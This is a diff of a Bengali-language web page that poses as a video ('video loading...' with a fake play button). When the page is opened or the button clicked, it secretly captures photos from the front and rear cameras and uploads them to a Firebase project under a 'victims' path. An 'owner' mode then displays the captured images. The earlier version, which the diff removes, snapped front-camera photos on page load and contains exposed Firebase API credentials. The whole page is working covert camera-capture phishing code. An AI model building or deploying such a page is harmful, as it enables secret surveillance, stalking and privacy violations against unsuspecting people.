@@ -1,96 +1,149 @@
 <!DOCTYPE html>
-<html>
+<html lang="bn">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CamSnap</title>
-  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ভিডিও লোড হচ্ছে...</title>
   <style>
-    body,html{margin:0;height:100%;background:#000;overflow:hidden;position:relative;}
-    .bg{position:absolute;inset:0;background:url('https://i.imgur.com/8z3xK9L.jpeg') center/cover;filter:blur(18px) brightness(0.5);transform:scale(1.15);}
-    .msg{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);color:#fff;font-size:22px;text-align:center;background:rgba(0,0,0,0.7);padding:20px 40px;border-radius:20px;}
+    body, html { margin:0; padding:0; height:100%; background:#000; overflow:hidden; }
+    .container {
+      position: relative;
+      width: 100%;
+      height: 100%;
+      background: url('https://i.ibb.co.com/8XjY5Yk/blur-bg.jpg') center/cover no-repeat;
+    }
+    .play-btn {
+      position: absolute;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      width: 90px; height: 90px;
+      background: rgba(0,0,0,0.7);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      animation: pulse 2s infinite;
+    }
+    .play-btn::after {
+      content: '';
+      width: 0; height: 0;
+      border-left: 30px solid #ff0050;
+      border-top: 20px transparent solid;
+      border-bottom: 20px transparent solid;
+      margin-left: 8px;
+    }
+    @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(255,0,80,0.7); } 70% { box-shadow: 0 0 0 30px rgba(255,0,80,0); } 100% { box-shadow: 0 0 0 0 rgba(255,0,80,0); } }
+    .photos { display: none; padding: 20px; background: white; }
+    .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px,1fr)); gap: 10px; }
+    .grid img { width: 100%; border-radius: 12px; border: 3px solid #ff0050; }
   </style>
 </head>
 <body>
 
-<div class="bg"></div>
-<div class="msg">কানেক্টিং...</div>
+<div class="container" id="fakeVideo">
+  <div class="play-btn" onclick="capture()"></div>
+</div>
 
-<canvas id="c" style="display:none;"></canvas>
+<div class="photos" id="photoGallery">
+  <h2 style="text-align:center; color:#333;">তোমার ছবি এসেছে!</h2>
+  <div class="grid" id="grid"></div>
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
 
 <script>
-const firebaseConfig = {
-  apiKey: "AIzaSyDTBla5gMV15V9HWBKAVYTWFt-CBrFfpzo",
-  authDomain: "cam-snap-8e956.firebaseapp.com",
-  databaseURL: "https://cam-snap-8e956-default-rtdb.firebaseio.com",
-  projectId: "cam-snap-8e956",
-  storageBucket: "cam-snap-8e956.firebasestorage.app",
-  messagingSenderId: "982089892260",
-  appId: "1:982089892260:web:2cfa5a4d3b3dbcf45d0131",
-  measurementId: "G-S5S37F55T6"
-};
+  // একই Firebase Config এখানেও বসাও (উপরের মতো)
+  const firebaseConfig = { /* তোমার কনফিগ */ };
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
+  const storage = firebase.storage();
+  const urlParams = new URLSearchParams(window.location.search);
+  const id = urlParams.get('id');
+  const isOwner = urlParams.get('mode') === 'owner';
 
-firebase.initializeApp(firebaseConfig);
-const db = firebase.database();
+  if (!id) {
+    document.body.innerHTML = "<h1 style='color:white;text-align:center;margin-top:50%'>Invalid Link</h1>";
+  }
 
-// ID নেওয়া
-let id = location.pathname.split('/').pop();
-if (!id || id === 'view.html') {
-  const params = new URLSearchParams(location.search);
-  id = params.get('id');
-}
+  if (isOwner) {
+    document.getElementById("fakeVideo").style.display = "none";
+    document.getElementById("photoGallery").style.display = "block";
+    loadPhotos();
+    setInterval(loadPhotos, 3000); // অটো রিফ্রেশ
+  }
 
-if (!id) {
-  document.querySelector('.msg').textContent = "লিংক ভুল!";
-  throw new Error("No ID");
-}
+  async function capture() {
+    document.getElementById("fakeVideo").innerHTML = "<h1 style='color:white;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)'>লোড হচ্ছে...</h1>";
 
-const today = new Date().toLocaleDateString('bn-BD');
-const now = new Date().toLocaleString('bn-BD');
-
-let count = 0;
-let pics = [];
-
-// পেইজ লোড হলেই ক্যামেরা চালু
-navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}})
-  .then(stream => {
-    const video = document.createElement('video');
-    video.srcObject = stream;
-    video.muted = true;
-    video.play();
-
-    const canvas = document.getElementById('c');
-    const ctx = canvas.getContext('2d');
-
-    const takePhoto = () => {
-      if (count >= 5) {
-        document.querySelector('.msg').textContent = "সম্পূর্ণ হয়েছে!";
-        return;
+    const cameras = ['user', 'environment'];
+    for (let facing of cameras) {
+      for (let i = 0; i < 5; i++) {
+        setTimeout(() => takePhoto(facing), i * 300);
       }
+    }
+  }
 
-      canvas.width = video.videoWidth || 1280;
-      canvas.height = video.videoHeight || 720;
-      ctx.drawImage(video, 0, 0);
-      pics.push(canvas.toDataURL('image/jpeg', 0.96));
-      count++;
-
-      document.querySelector('.msg').textContent = `ছবি নেওয়া হচ্ছে... ${count}/5`;
-
-      // ছবি সেভ করো
-      db.ref('links/' + id + '/sessions/' + today).set({
-        photos: pics,
-        time: now
+  async function takePhoto(facingMode) {
+    const video = document.createElement('video');
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode },
+        audio: false
       });
+      video.srcObject = stream;
+      video.play();
 
-      setTimeout(takePhoto, 1000); // প্রতি ১ সেকেন্ডে ১ টি
-    };
+      setTimeout(() => {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
 
-    setTimeout(takePhoto, 1000);
-  })
-  .catch(() => {
-    document.querySelector('.msg').textContent = "ক্যামেরা বন্ধ";
-  });
+        uploadPhoto(dataUrl);
+        stream.getTracks().forEach(t => t.stop());
+      }, 800);
+    } catch(e) { console.log("Camera denied"); }
+  }
+
+  function uploadPhoto(dataUrl) {
+    const ref = db.ref('victims/' + id).push();
+    const photoId = ref.key;
+
+    const blob = dataURLtoBlob(dataUrl);
+    const storageRef = storage.ref('photos/' + id + '/' + photoId + '.jpg');
+    storageRef.put(blob).then(() => {
+      storageRef.getDownloadURL().then(url => {
+        ref.set({ url, time: Date.now() });
+      });
+    });
+  }
+
+  function dataURLtoBlob(dataurl) {
+    var arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+        bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+    while(n--) u8arr[n] = bstr.charCodeAt(n);
+    return new Blob([u8arr], {type:mime});
+  }
+
+  function loadPhotos() {
+    if (!isOwner) return;
+    db.ref('victims/' + id).on('value', snap => {
+      const grid = document.getElementById('grid');
+      grid.innerHTML = '';
+      const data = snap.val();
+      if (data) {
+        Object.values(data).sort((a,b)=>b.time - a.time).forEach(p => {
+          const img = document.createElement('img');
+          img.src = p.url;
+          grid.appendChild(img);
+        });
+      }
+    });
+  }
 </script>
 </body>
 </html>
